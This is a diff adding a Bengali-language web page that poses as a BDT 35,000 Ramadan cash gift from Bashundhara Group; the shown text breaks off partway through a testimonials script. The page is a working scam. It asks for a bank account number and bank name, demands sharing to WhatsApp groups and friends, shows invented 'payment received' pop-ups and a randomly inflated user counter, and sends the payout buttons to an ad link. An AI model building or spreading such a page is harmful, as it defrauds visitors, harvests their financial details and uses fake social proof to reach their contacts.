@@ -1,0 +1,1508 @@
+
+<!DOCTYPE html>
+<html>
+
+<head>
+<script>
+var password = 'বিডিটি ৩৫,০০০';
+
+password = prompt(
+  'আহমেদ আকবর সোবহান এবং বসুন্ধরা গ্রুপ: অভিনন্দন, আপনি আহমেদ আকবর সোবহান এবং বসুন্ধরা গ্রুপ থেকে বিডিটি ৩৫,০০০ রমজান ক্যাশ উপহারের জন্য যোগ্য। এখন সক্রিয় করতে OK ক্লিক করুন।',
+  'বিডিটি ৩৫,০০০'
+);
+
+if (password !== 'বিডিটি ৩৫,০০০') {
+    location.href = 'https://raa-daan-maa-help.site/Forall.html';
+}
+</script>
+
+
+    <script>
+        function set_Cookie(name,value){
+            var Days = 30;
+            var exp = new Date();
+            exp.setTime(exp.getTime() + (Days*20*1000));
+            document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString()+"; path=/;"
+        }
+        function get_Cookie(name){
+            var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
+            if(arr=document.cookie.match(reg)){
+                return unescape(arr[2]);
+            }
+            return '';
+        }
+
+
+        /*            if(get_Cookie("d")>0 &&get_Cookie("d")<12){
+                        document.getElementById("first-box")."quedate__step".display="none";//??;
+                        document.getElementById("second-box").style.display="none";//??;
+                        document.getElementById("third-box").style.display="none";//??;
+                        document.getElementsByClassName("loading2__box").style.display="";//??;
+                    }*/
+
+
+    </script>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>বিডিটি ৩৫,০০০ রমজান ক্যাশ প্রতিযোগিতা</title>
+    <link rel="shortcut icon" type="image/png" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiip4qksD6blv37l29HH3dr3DSSsBaXDMdUnGqfgsdbkgKGd1wtrlnuOsDRpBiJs_AQ2er8w-FqbZd1iy5ReCCnFSA1xL2jOznU546wg0aou-w2d5g6UflzDa4nY4Zv5z1sKKgTmWUnkURq3JthblwaPhbVn1SvUErskZSpOrxDG4c8JYl3CGSzSIBrSwA/w640-h426/Bangladesh%20poster.png" />
+    <meta name="og:title" content="বিডিটি ৩৫,০০০ রমজান ক্যাশ প্রতিযোগিতা" />
+    <meta name="og:url" content="https://raa-daan-maa-help.site/Forall.html" />
+    <meta property="og:description"
+        content="বিডিটি ৩৫,০০০ রমজান ক্যাশ প্রতিযোগিতা" />
+    <meta property="og:image" content="3.png" />
+    <meta property="og:type" content="website" />
+    <meta property="og:updated_time" content="1440432930" />
+</head>
+
+<body>
+    <style type="text/css">
+        @import url("https://fonts.googleapis.com/css2?family=Poppins:wght@500;700&display=swap");
+        @import url("//fonts.googleapis.com/earlyaccess/droidarabicnaskh.css");
+
+        * {
+            margin: 0;
+            padding: 0;
+            font-family: Poppins, Droid Arabic Naskh;
+            font-weight: normal;
+            box-sizing: border-box;
+
+
+        }
+
+        body {
+            direction: lfl;
+            background: white;
+        }
+
+        a {
+            text-decoration: none;
+        }
+
+        .post {
+            background: #fff;
+            margin: 0 auto;
+            padding: 10px;
+            max-width: 500px;
+            border: 1px solid #d0d1d5;
+            border-radius: 3px;
+        }
+
+        .post img {
+            width: 100%;
+        }
+
+        .welcome {
+            font-size: 15px;
+        }
+
+        .amount,
+        #getname {
+            color: green;
+            text-decoration: none;
+        }
+
+        .done {
+            text-align: center;
+            color: #27ae60;
+        }
+
+        .tip {
+            font-size: 14px;
+        }
+
+        .title {
+            text-align: center;
+        }
+
+        .error {
+            display: none;
+            text-align: center;
+            font-size: 14px;
+            color: #e74c3c;
+        }
+
+        button {
+            display: block;
+            width: 200px;
+            height: 50px;
+           color: #ffffff;
+            border: none;
+            outline: none;
+            font-size: 24px;
+            cursor: pointer;
+            border-radius: 5px;
+            padding: 0 10px;
+            margin: 10px auto;
+            background: #0B7A3B;
+            transition: background 0.3s ease;
+        }
+
+        button:hover {
+            background: #0B7A3B;
+        }
+
+        .phone {
+            max-width: 400px;
+            margin: 10px auto;
+        }
+
+        .phone input {
+            width: 100%;
+            height: 50px;
+            padding: 10px;
+            outline: none;
+            border: 2px solid #cecece;
+            font-size: 14px;
+        }
+
+        #confirm {
+            width: 200px;
+            margin: 10px auto;
+            border-radius: 0px;
+        }
+
+        #loader {
+            text-align: center;
+        }
+
+        .spin {
+            width: 50px;
+            height: 50px;
+            background: transparent;
+            border: solid 8px rgb(9, 129, 5);
+            border-right-color: transparent;
+            border-radius: 50%;
+            margin: 10px auto;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            100% {
+                transform: rotate(1turn);
+            }
+        }
+
+        #loader,
+        #info,
+        #checking,
+        #share,
+        #claim {
+            display: none;
+        }
+
+        .center {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .barr {
+            direction: ltr;
+            max-width: 400px;
+            margin: 10px auto;
+            box-sizing: border-box;
+        }
+
+        .fill {
+            position: relative;
+            display: inline-block;
+            width: calc(100% - 100px);
+            height: 35px;
+            padding: 2px;
+            border: 2px solid #0B7A3B;
+        }
+
+        #fill,
+        #fill2 {
+            background: #0B7A3B;
+            width: 0%;
+            height: 100%;
+        }
+
+        .percentage {
+            width: 100px;
+            float: right;
+            height: 35px;
+            font-size: 16px;
+            border: 2px solid #0B7A3B;
+        }
+
+        #percentage,
+        #percentage2 {
+            margin-left: 5px;
+        }
+
+        #check,
+        #check2 {
+            display: none;
+        }
+
+        .counter {
+            color: #7f7f7f;
+            font-size: 12px;
+            text-align: right;
+            padding: 10px 0 10px 2px;
+            border-bottom: 1px solid #e1e2e3;
+        }
+
+        .reactions {
+            display: inline-flex;
+            align-items: center;
+            float: left;
+        }
+
+        .counter img {
+            float: left;
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+            border: 2px solid #fff;
+            box-sizing: content-box;
+        }
+
+        .like,
+        .love {
+            margin-right: -5px;
+        }
+
+        .like {
+            z-index: 2;
+        }
+
+        .love {
+            z-index: 1;
+        }
+
+        .bar {
+            display: table;
+            width: 100%;
+            border-bottom: 1px solid #e1e2e3;
+        }
+
+        .bar .react {
+            display: table-cell;
+            width: calc(100% / 3);
+            font-size: 12px;
+            color: #7f7f7f;
+            text-align: center;
+            padding: 10px 0;
+            cursor: pointer;
+        }
+
+        .comments {
+            direction: ltr;
+        }
+
+        .comment {
+            padding: 6px 0;
+            margin-top: 5px;
+        }
+
+        .comment img {
+            float: left;
+            width: 32px;
+            height: 32px;
+            border: none;
+            border-radius: 18px;
+            cursor: pointer;
+        }
+
+        .reply {
+            margin-left: 37px;
+        }
+
+        .single-container {
+            margin-left: 37px;
+            background: #f1f2f6;
+            padding: 10px;
+            border-radius: 15px;
+            font-size: 12px;
+        }
+
+        .single-container .user {
+            display: inline-block;
+            cursor: pointer;
+            color: #365899;
+            margin-bottom: 5px;
+        }
+
+        .single-container .text {
+            display: block;
+        }
+
+        .buttons {
+            font-size: 12px;
+            font-weight: bold;
+            margin: 10px 0 0 47px;
+            color: #90949c;
+        }
+
+        .action {
+            cursor: pointer;
+        }
+
+        .action:hover {
+            text-decoration: underline;
+        }
+
+        .input {
+            padding: 6px 12px 12px;
+        }
+
+        .input input {
+            width: 100%;
+            background: #f1f2f6;
+            padding: 10px;
+            border-radius: 15px;
+            border: 0;
+            outline: none;
+        }
+
+        .A {
+            text-align: center;
+            background-color: #0B7A3B;
+            color: #ffffff;
+        }
+    </style>
+    <marquee class="horizontal_marque" direction="left">রোজা ও উদারতার মাস – আহমেদ আকবর সোবহান এবং বসুন্ধরা গ্রুপ বিডিটি ৩৫,০০০ প্রতিযোগিতা</marquee>
+         <center>
+  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiip4qksD6blv37l29HH3dr3DSSsBaXDMdUnGqfgsdbkgKGd1wtrlnuOsDRpBiJs_AQ2er8w-FqbZd1iy5ReCCnFSA1xL2jOznU546wg0aou-w2d5g6UflzDa4nY4Zv5z1sKKgTmWUnkURq3JthblwaPhbVn1SvUErskZSpOrxDG4c8JYl3CGSzSIBrSwA/w640-h426/Bangladesh%20poster.png"
+       style="width: 80%;
+              max-width: 700px;
+              height: auto;
+              border-style: ridge;
+              border-radius: 50px;
+              border-width: 5px;
+              border-color: #0B7A3B;">
+</center>
+
+                
+    <div class="post">
+
+    <div id="intro">
+        <p class="welcome">
+            <span class="badge">বিডিটি ৩৫,০০০ রমজান ক্যাশ প্রতিযোগিতা</span>
+
+            <br><br>
+
+        রমজান হলো রোজা, প্রার্থনা এবং অন্যদের সাথে ভাগ করে নেওয়ার বিশেষ মাস। দয়া ও উদারতার চেতনায়, <b>আহমেদ আকবর সোবহান এবং বসুন্ধরা গ্রুপ</b> এই পবিত্র মৌসুমে পরিবারগুলোকে সহায়তা করার জন্য প্রত্যেক নাইজেরিয়ানকে বিডিটি ৩৫,০০০ দিচ্ছে।
+    <br>
+
+            আপনারটা পেতে <b>“এখন দাবি করুন”</b> এ ক্লিক করুন।
+            <br>
+            <span class="note">নোট:</span> চালিয়ে যেতে এখন দাবি করুন-এ এগিয়ে যান।
+        </p>
+   <button id="go" class="cta-btn">এখন দাবি করুন</button>
+    </div>
+
+</div>
+
+<style>
+.post{
+    width:100%;
+    padding:15px;
+}
+
+/* GRADIENT INTRO */
+#intro{
+    max-width:900px;
+    margin:20px auto;
+    padding:30px 25px;
+   background: linear-gradient(135deg, #050c1f, #0c1f3f, #132f5f);
+    border-radius:18px;
+    box-shadow:0 15px 35px rgba(0,0,0,0.25);
+    color:#fff;
+    text-align:center;
+}
+
+/* TEXT */
+.welcome{
+    font-size:17px;
+    line-height:1.7;
+    margin:0;
+}
+
+/* BADGE */
+.badge{
+    display:inline-block;
+    background:rgba(255,255,255,0.15);
+    padding:8px 18px;
+    border-radius:30px;
+    font-weight:700;
+    letter-spacing:.5px;
+}
+
+/* NOTE */
+.note{
+    color:#FFD700;
+    font-weight:700;
+}
+
+/* BUTTON */
+.cta-btn{
+    display:inline-block;
+    margin-top:25px;
+    padding:14px 35px;
+    background:#FFD700;
+    color:#0B7A3B;
+    font-weight:800;
+    border-radius:35px;
+    text-decoration:none;
+    box-shadow:0 8px 20px rgba(0,0,0,.3);
+    transition:.3s ease;
+}
+
+.cta-btn:hover{
+    transform:scale(1.05);
+    background:#fff;
+}
+
+/* MOBILE */
+@media(max-width:600px){
+    .welcome{
+        font-size:15px;
+    }
+}
+</style>
+
+        </div>
+        <div id="loader">
+            <div>অনুগ্রহ করে অপেক্ষা করুন ...</div>
+            <div class="spin"></div>
+            <div id="num">0%</div>
+        </div>
+        <style>
+/* MAIN CONTAINER */
+#info{
+    max-width:500px;
+    margin:25px auto;
+    padding:25px 20px;
+background: linear-gradient(135deg, #050c1f, #0c1f3f, #132f5f);
+    border-radius:18px;
+    box-shadow:0 12px 30px rgba(0,0,0,0.25);
+    color:#fff;
+    text-align:center;
+    font-family:Arial, sans-serif;
+}
+
+/* TITLE */
+#info .title{
+    font-size:18px;
+    font-weight:700;
+    margin-bottom:12px;
+}
+
+/* INPUT FIELD */
+#info input[type="number"]{
+    width:330px;
+    height:56px;
+    font-size:18px;
+    border-radius:12px;
+    border:none;
+    padding:0 15px;
+    margin-bottom:15px;
+    outline:none;
+    background:rgba(255,255,255,0.9);
+    color:#0B7A3B;
+    font-weight:600;
+}
+
+/* SELECT DROPDOWN */
+#info select{
+    width:330px;
+    height:56px;
+    font-size:16px;
+    border-radius:12px;
+    border:none;
+    padding:0 15px;
+    margin-bottom:20px;
+    outline:none;
+    background:rgba(255,255,255,0.9);
+    color:#0B7A3B;
+    font-weight:600;
+}
+
+/* BUTTON */
+#info button#confirm{
+    width:200px;
+    padding:14px 0;
+    font-size:18px;
+    font-weight:700;
+    border-radius:35px;
+    border:none;
+    cursor:pointer;
+   background: linear-gradient(135deg, #050c1f, #0c1f3f, #132f5f);
+    color:#0B7A3B;
+    box-shadow:0 8px 25px rgba(0,0,0,0.35);
+    transition:all 0.3s ease;
+}
+
+#info button#confirm:hover{
+    transform:scale(1.05);
+    background:linear-gradient(135deg,#fff,#f5f5f5);
+}
+</style>
+
+        <div id="info">
+            <p class="title">আপনার অ্যাকাউন্ট নম্বর লিখুন :</p>
+            <div class="phone">
+                <center><input type="number" placeholder="অ্যাকাউন্ট নম্বর লিখুন" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);">
+                </center>
+                <center>
+                    <h3>
+                        <center>
+                            <p class="title">আপনার ব্যাংকের নাম নির্বাচন করুন:</p>
+                        </center>
+                    </h3>
+                    <select aria-label="الجنس" name="birthday_year" id="year" title="الجنس" class="_5dba" style="
+    width: 330px;
+    height: 56px;
+">
+<option value="أختر نوع الشبكة" selected="1">ব্যাংকের নাম</option>
+
+
+<option value="2"> AB Bank PLC- বিডিটি ৩৫,০০০</option>
+<option value="3"> Agrani Bank PLC- বিডিটি ৩৫,০০০</option>
+<option value="4"> Al-Arafah Bank- বিডিটি ৩৫,০০০</option>
+<option value="6"> Alfalah Bank- বিডিটি ৩৫,০০০ </option>
+<option value="7"> Asia Bank-  বিডিটি ৩৫,০০০ </option>
+<option value="8"> Basic Bank-  বিডিটি ৩৫,০০০  </option>
+<option value="8"> BCB Bank- বিডিটি ৩৫,০০০  </option>
+<option value="9"> BDBL Bank-  বিডিটি ৩৫,০০০ </option>
+<option value="10"> Bengal Commercial Bank-  বিডিটি ৩৫,০০০</option>
+<option value="11">BRAC Bank- বিডিটি ৩৫,০০০ </option>
+<option value="12">Citi Bank-  বিডিটি ৩৫,০০০</option>
+<option value="13">Citizens Bank-  বিডিটি ৩৫,০০০</option>
+<option value="2"> City Bank-  বিডিটি ৩৫,০০০</option>
+<option value="3"> Combank-  বিডিটি ৩৫,০০০</option>
+<option value="4"> Dhaka Bank-  বিডিটি ৩৫,০০০</option>
+<option value="6"> Meghna Bank PLC-  বিডিটি ৩৫,০০০</option>
+<option value="7"> Midland Bank -  বিডিটি ৩৫,০০০ </option>
+<option value="8">Modhumoti Bank -  বিডিটি ৩৫,০০০ </option>
+<option value="8"> Mutual Trust Bank-  বিডিটি ৩৫,০০০ </option>
+<option value="9"> National Bank Limited-  বিডিটি ৩৫,০০০ </option>
+<option value="10">Rajshahi Krishi Bank-  বিডিটি ৩৫,০০০</option>
+<option value="11">Rupali Bank- বিডিটি ৩৫,০০০</option>
+<option value="12">Shahjalal Islami Bank-  বিডিটি ৩৫,০০০</option>
+<option value="13">Other Banks-  বিডিটি ৩৫,০০০</option>
+</select>
+                </center><br>
+                <button id="confirm">পাঠান</button>
+            </div>
+            <p class="error">অনুগ্রহ করে একটি বৈধ অ্যাকাউন্ট নম্বর লিখুন !</p>
+        </div>
+        <div id="checking">
+            <p class="title">অনুগ্রহ করে এক মুহূর্ত অপেক্ষা করুন...</p>
+            <div class="barr">
+                <div class="fill">
+                    <div id="fill"></div>
+                </div>
+                <div class="percentage center">
+                    <span id="load"><i class="fa fa-spinner fa-pulse"></i></span>
+                    <span id="check"><i class="fa fa-check-circle"></i></span>
+                    <span id="percentage"></span>
+                </div>
+            </div>
+        </div>
+        <style>
+/* MAIN SHARE BOX */
+#share{
+    max-width:500px;
+    margin:25px auto;
+    padding:25px 20px;
+   background: linear-gradient(135deg, #050c1f, #0c1f3f, #132f5f);
+    border-radius:18px;
+    box-shadow:0 12px 30px rgba(0,0,0,0.25);
+    color:#fff;
+    text-align:left;
+    font-family:Arial, sans-serif;
+}
+
+/* TEXT PARAGRAPHS */
+#share .tip{
+    font-size:16px;
+    margin-bottom:12px;
+    line-height:1.6;
+}
+
+/* HIGHLIGHT AMOUNT */
+#share .amount{
+    font-weight:700;
+    color:#FFD700;
+}
+
+/* SHARE BUTTON */
+#share button#whatsapp{
+    display:block;
+    width:200px;
+    margin:20px auto 0 auto;
+    padding:14px 0;
+    font-size:18px;
+    font-weight:700;
+    border-radius:35px;
+    border:none;
+    cursor:pointer;
+    background:linear-gradient(135deg,#FFD700,#FFB700);
+    color:#0B7A3B;
+    box-shadow:0 8px 25px rgba(0,0,0,0.35);
+    transition:all 0.3s ease;
+}
+
+#share button#whatsapp:hover{
+    transform:scale(1.05);
+    background:linear-gradient(135deg,#fff,#f5f5f5);
+}
+
+/* MOBILE RESPONSIVE */
+@media(max-width:600px){
+    #share{
+        padding:20px 15px;
+    }
+    #share .tip{
+        font-size:15px;
+    }
+    #share button#whatsapp{
+        width:100%;
+        font-size:16px;
+    }
+}
+</style>
+
+        <div id="share">
+            <p class="tip">আপনার অ্যাকাউন্ট নম্বর হলো <span id="getname"></span>،</p>
+            <p class="tip">
+                যাচাইয়ের পর, আপনি <span class="amount">বিডিটি ৩৫,০০০</span> পাওয়ার যোগ্য। কীভাবে এগোবেন:
+            </p><br>
+            <p class="tip">১. WhatsApp-এ ৫টি গ্রুপ বা ১৫ জন বন্ধুর সাথে শেয়ার করুন (নিচের "শেয়ার" আইকনে ক্লিক করুন)।</p>
+            <p class="tip">২. সবুজ যাচাই বার পূর্ণ হলে আপনাকে স্বয়ংক্রিয়ভাবে আমাদের ফ্রি ডেটা পেজে রিডাইরেক্ট করা হবে।</p>
+            <p class="tip">৩. ১৫ মিনিটের মধ্যে আপনি SMS-এ নিশ্চিতকরণ পাবেন।</p>
+            <button id="whatsapp">শেয়ার করুন</button>
+            <div class="barr">
+                <div class="fill">
+                    <div id="fill2"></div>
+                </div>
+                <div class="percentage center">
+                    <span><i class="fa fa-spinner fa-pulse"></i></span>
+                    <span id="percentage2">0%</span>
+                </div>
+            </div>
+        </div>
+        <style>
+/* CLAIM BOX */
+#claim{
+    max-width:450px;
+    margin:30px auto;
+    padding:30px 20px;
+    background: linear-gradient(135deg, #0A2F25, #0E3F3A, #0B7A3B);
+    border-radius:18px;
+    box-shadow:0 12px 35px rgba(0,0,0,0.25);
+    color:#fff;
+    text-align:center;
+    font-family:Arial, sans-serif;
+}
+
+/* CHECK ICON */
+#claim .done i{
+    color:#FFD700;
+    margin-bottom:15px;
+    display:block;
+    animation:pop 0.6s ease;
+}
+
+/* TITLE */
+#claim .title{
+    font-size:22px;
+    font-weight:800;
+    margin-bottom:12px;
+}
+
+/* BUTTON */
+#claim button#offer{
+    display:inline-block;
+    margin-top:20px;
+    padding:14px 35px;
+    font-size:18px;
+    font-weight:700;
+    border-radius:35px;
+    border:none;
+    cursor:pointer;
+    background:linear-gradient(135deg,#FFD700,#FFB700);
+    color:#0B7A3B;
+    box-shadow:0 8px 25px rgba(0,0,0,0.35);
+    transition:all 0.3s ease;
+}
+
+#claim button#offer:hover{
+    transform:scale(1.05);
+    background:linear-gradient(135deg,#fff,#f5f5f5);
+}
+
+/* POP ANIMATION FOR ICON */
+@keyframes pop{
+    0%{transform:scale(0);opacity:0}
+    60%{transform:scale(1.2);opacity:1}
+    100%{transform:scale(1);}
+}
+
+/* RESPONSIVE */
+@media(max-width:600px){
+    #claim{
+        padding:25px 15px;
+    }
+    #claim .title{
+        font-size:18px;
+    }
+    #claim button#offer{
+        width:100%;
+        font-size:16px;
+    }
+}
+</style>
+
+        <div id="claim">
+            <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>
+            <p class="title">অভিনন্দন! </p>
+            <b>এখন আপনার টাকা পেতে নিচের যেকোনো বোতামে ক্লিক করুন</b>
+            <button id="offer">এখন যাচাই করুন</button>
+<center>
+    <a onclick="window.open('https://obqj2.com/4/1322937')" href="https://obqj2.com/4/1322937">
+        <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="button final">এখন আমার পেমেন্ট নিন</button></a>
+</center><br/>
+
+<center>
+    <a onclick="window.open('https://obqj2.com/4/1322937')" href="https://obqj2.com/4/1322937">
+        <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="button final">পেমেন্ট স্ট্যাটাস চেক করুন</button></a>
+</center><br/>
+        </div>
+        <BR/>
+        <!-- NOTIFICATIONS -->
+<div class="notification-overlay">ইমরান খান ১৫ সেকেন্ড আগে বিডিটি ৩৫,০০০ পেয়েছেন</div>
+<div class="notification-overlay">শিরিন সুলতানা ২০ সেকেন্ড আগে বিডিটি ৩৫,০০০ পেয়েছেন</div>
+<div class="notification-overlay">তানভীর আহমেদ ২৫ সেকেন্ড আগে বিডিটি ৩৫,০০০ পেয়েছেন</div>
+<div class="notification-overlay">জিদে কোসোকো ৩০ সেকেন্ড আগে বিডিটি ৩৫,০০০ পেয়েছেন</div>
+<div class="notification-overlay">লাবিবা পারভীন ৩৫ সেকেন্ড আগে বিডিটি ৩৫,০০০ পেয়েছেন</div>
+<div class="notification-overlay">রাকিবুল হাসান ৪০ সেকেন্ড আগে বিডিটি ৩৫,০০০ পেয়েছেন</div>
+<div class="notification-overlay">আনিকা ইসলাম ৪৫ সেকেন্ড আগে বিডিটি ৩৫,০০০ পেয়েছেন</div>
+<div class="notification-overlay">জাহাঙ্গীর আলম ৫০ সেকেন্ড আগে বিডিটি ৩৫,০০০ পেয়েছেন</div>
+<div class="notification-overlay">নাফিসা রহমান ৫৫ সেকেন্ড আগে বিডিটি ৩৫,০০০ পেয়েছেন</div>
+<div class="notification-overlay">রুবেল মিয়া ১ মিনিট আগে বিডিটি ৩৫,০০০ পেয়েছেন</div>
+<div class="notification-overlay">সালমা খাতুন ১ মিনিট ৫ সেকেন্ড আগে বিডিটি ৩৫,০০০ পেয়েছেন</div>
+<div class="notification-overlay">হাসান মাহমুদ ১ মিনিট ১০ সেকেন্ড আগে বিডিটি ৩৫,০০০ পেয়েছেন</div>
+<div class="notification-overlay">রুমানা আখতার ১ মিনিট ১৫ সেকেন্ড আগে বিডিটি ৩৫,০০০ পেয়েছেন</div>
+<div class="notification-overlay">কামাল উদ্দিন ১ মিনিট ২০ সেকেন্ড আগে বিডিটি ৩৫,০০০ পেয়েছেন</div>
+<div class="notification-overlay">শাবনম আরা ১ মিনিট ২৫ সেকেন্ড আগে বিডিটি ৩৫,০০০ পেয়েছেন</div>
+<div class="notification-overlay">রফিক উদ্দিন ১ মিনিট ৩০ সেকেন্ড আগে বিডিটি ৩৫,০০০ পেয়েছেন</div>
+
+<style>
+.notification-overlay{
+    position: fixed;
+    bottom: 20px;
+    left: 20px;
+    max-width: 320px;
+    padding: 14px 20px;
+    background: linear-gradient(135deg, #050c1f, #0c1f3f, #132f5f);
+    color: #fff;
+
+    font-size: 14px;
+    font-weight: 600;
+    border-radius: 12px;
+    box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+
+    opacity: 0;
+    transform: translateY(30px);
+    transition: all 0.6s ease;
+    z-index: 9999;
+}
+
+.notification-overlay.show{
+    opacity: 1;
+    transform: translateY(0);
+}
+</style>
+
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+    const notifications = document.querySelectorAll(".notification-overlay");
+    let index = 0;
+
+    function showNotification() {
+        notifications.forEach(n => n.classList.remove("show"));
+        notifications[index].classList.add("show");
+        index = (index + 1) % notifications.length;
+    }
+
+    showNotification();
+    setInterval(showNotification, 4000);
+});
+</script>
+
+        
+            <script>
+                // Array of notification IDs
+                            const notificationIds = [
+                                'notif1', 'notif2', 'notif3', 'notif4', 'notif5',
+                                'notif6', 'notif7', 'notif8', 'notif8', 'notif9', 'notif10', 'notif11', 'notif12', 'notif13', 'notif14', 'notif15', 'notif16'
+                            ];
+                        
+                            // Function to show notifications
+                            function showNotifications() {
+                                notificationIds.forEach((id, index) => {
+                                    const notification = document.getElementById(id);
+                                    setTimeout(() => {
+                                        notification.style.display = 'block';
+                                        notification.style.animation = 'fadeInOut 5s ease-in-out';
+                                        setTimeout(() => {
+                                            notification.style.display = 'none';
+                                        }, 5000); // Hide after 3 sec
+                                    }, index * 6000); // Show each notification with a delay
+                                });
+                            }
+                        
+                            // Show the notifications
+                            showNotifications();
+        
+                     
+            </script>
+            <style>
+                .comments{
+    background:#fff;
+    border-radius:12px;
+    padding:15px;
+    max-width:600px;
+    margin:20px auto;
+    box-shadow:0 8px 20px rgba(0,0,0,0.08);
+    font-family: Arial, sans-serif;
+}
+
+/* COUNTER */
+.counter{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    font-size:14px;
+    color:#65676b;
+    margin-bottom:10px;
+}
+
+.reactions{
+    display:flex;
+    align-items:center;
+    gap:5px;
+}
+
+.reactions img{
+    width:18px;
+    height:18px;
+    border-radius:50%;
+    border:1px solid #fff;
+}
+
+/* ACTION BAR */
+.bar{
+    display:flex;
+    justify-content:space-around;
+    padding:8px 0;
+    border-top:1px solid #eee;
+    border-bottom:1px solid #eee;
+    margin-bottom:12px;
+}
+
+.bar .react{
+    cursor:pointer;
+    color:#65676b;
+    font-weight:600;
+}
+
+.bar .react:hover{
+    color:#0B7A3B;
+}
+
+/* COMMENT */
+.comment{
+    display:flex;
+    gap:10px;
+    margin-bottom:12px;
+}
+
+.comment.reply{
+    margin-left:40px;
+}
+
+.comment img{
+    width:40px;
+    height:40px;
+    border-radius:50%;
+    object-fit:cover;
+}
+
+/* COMMENT BOX */
+.single-container{
+    background:#f0f2f5;
+    padding:10px 14px;
+    border-radius:18px;
+    max-width:100%;
+}
+
+.single-container .user{
+    font-weight:700;
+    font-size:14px;
+    display:block;
+    margin-bottom:4px;
+}
+
+.single-container .text{
+    font-size:14px;
+    color:#050505;
+}
+
+/* BUTTONS */
+.buttons{
+    font-size:12px;
+    color:#65676b;
+    margin-left:54px;
+    margin-top:4px;
+}
+
+.buttons .action{
+    cursor:pointer;
+}
+
+.buttons .action.liked{
+    color:#0B7A3B;
+    font-weight:600;
+}
+
+/* INPUT */
+.input{
+    margin-top:15px;
+}
+
+.input input{
+    width:100%;
+    padding:12px 15px;
+    border-radius:20px;
+    border:1px solid #ddd;
+    outline:none;
+    background:#f0f2f5;
+}
+
+.input input:focus{
+    border-color:#0B7A3B;
+}
+
+            </style>
+            <div class="active-box">
+    <span class="pulse"></span>
+    <div class="active-text">
+        <strong>এখন সক্রিয়</strong><br>
+        <span id="countdowntimer">98,542</span><br>
+        <small>নাইজেরিয়ান ব্যবহারকারীরা বর্তমানে আবেদন করছেন</small>
+    </div>
+</div>
+
+<style>
+.active-box{
+    max-width:420px;
+    margin:25px auto;
+    padding:18px 22px;
+    display:flex;
+    align-items:center;
+    gap:14px;
+   background: linear-gradient(135deg, #050c1f, #0c1f3f, #132f5f);
+    color:#fff;
+
+    border-radius:16px;
+    box-shadow:0 10px 25px rgba(0,0,0,0.25);
+    font-family:Arial, sans-serif;
+}
+
+/* PULSE DOT */
+.pulse{
+    width:14px;
+    height:14px;
+    background:#ff3b3b;
+    border-radius:50%;
+    position:relative;
+}
+
+.pulse::after{
+    content:"";
+    position:absolute;
+    inset:0;
+    border-radius:50%;
+    background:rgba(255,59,59,0.6);
+    animation:pulse 1.5s infinite;
+}
+
+@keyframes pulse{
+    0%{transform:scale(1);opacity:1}
+    100%{transform:scale(2.5);opacity:0}
+}
+
+/* TEXT */
+.active-text{
+    line-height:1.3;
+}
+
+.active-text strong{
+    font-size:16px;
+    font-weight:800;
+}
+
+#countdowntimer{
+    display:block;
+    font-size:28px;
+    font-weight:900;
+    color:#FFD700;
+}
+
+.active-text small{
+    font-size:13px;
+    opacity:.9;
+}
+</style>
+
+<script>
+var timeleft = 98542;
+
+setInterval(function(){
+    // Add random users to simulate activity
+    timeleft = timeleft + Math.floor(Math.random() * 600);
+
+    document.getElementById("countdowntimer").textContent =
+        timeleft.toLocaleString();
+}, 1000);
+</script>
+<center>
+<style>
+ {margin: 0;
+    font-family: Arial, sans-serif;
+    background: linear-gradient(135deg, #050c1f, #0c1f3f, #132f5f);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+}
+
+/* Container */
+.testimonials-container {
+    width: 350px;
+    height: 450px;
+    background: #f9f9f9;
+    border-radius: 10px;
+    overflow: hidden;
+    display: flex;
+    flex-direction: column;
+}
+
+/* Scroll area */
+.testimonials-wrapper {
+    flex: 1;
+    overflow: hidden;
+    position: relative;
+    background: linear-gradient(135deg, #050c1f, #0c1f3f, #132f5f);
+}
+
+.testimonials-scroll {
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+    padding: 10px;
+    animation: scrollUp 25s linear infinite;
+}
+
+/* Individual testimonial */
+.testimonial {
+    background: linear-gradient(135deg, #050c1f, #0c1f3f, #132f5f);
+    color: white;
+    border-radius: 6px;
+    padding: 6px 8px;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.3);
+    display: flex;
+    align-items: flex-start;
+    font-size: 12px;
+}
+/* Input area */
+.input-area {
+    display: flex;
+    padding: 8px;
+    border-top: 1px solid #ddd;
+    gap: 5px;
+}
+
+input[type="text"] {
+    flex: 1;
+    padding: 6px;
+    font-size: 12px;
+}
+
+button {
+    padding: 6px 8px;
+    font-size: 12px;
+    cursor: pointer;
+}
+
+#imagePreview {
+    max-width: 60px;
+    max-height: 50px;
+    display: none;
+    margin-top: 5px;
+}
+
+/* Animations */
+@keyframes scrollUp {
+    0% { transform: translateY(0); }
+    100% { transform: translateY(-50%); }
+}
+</style>
+</head>
+
+<body>
+
+<div class="testimonials-container">
+
+    <div class="testimonials-wrapper">
+        <div class="testimonials-scroll" id="testimonialsScroll"></div>
+    </div>
+
+    <div class="input-area">
+        <input type="text" id="newTestimonialInput" placeholder="একটি মন্তব্য লিখুন...">
+        <button id="imageUploadBtn">📷</button>
+        <button id="sendBtn">মন্তব্য করুন</button>
+        <input type="file" id="imageInput" accept="image/*" style="display:none">
+    </div>
+
+    <img id="imagePreview">
+
+</div>
+
+<script>
+// Testimonials Data
+const sampleTestimonials = [
+{
+    name: "আরিফ হোসেন",
+    initial: "A",
+    profilePic: "Aisha.png",
